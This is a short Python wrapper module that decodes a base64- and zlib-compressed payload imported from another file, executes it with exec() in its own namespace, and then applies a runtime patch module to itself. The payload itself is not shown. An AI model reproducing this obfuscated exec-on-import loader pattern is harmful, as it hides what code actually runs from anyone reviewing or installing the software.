from __future__ import annotations

import base64
import sys
import zlib

from main_wrapper_01255_payload import PAYLOAD

_SOURCE = zlib.decompress(base64.b64decode(PAYLOAD)).decode("utf-8")
exec(compile(_SOURCE, "main_wrapper_01255.py", "exec"), globals())

import release_01255_patch

release_01255_patch.apply(sys.modules[__name__])
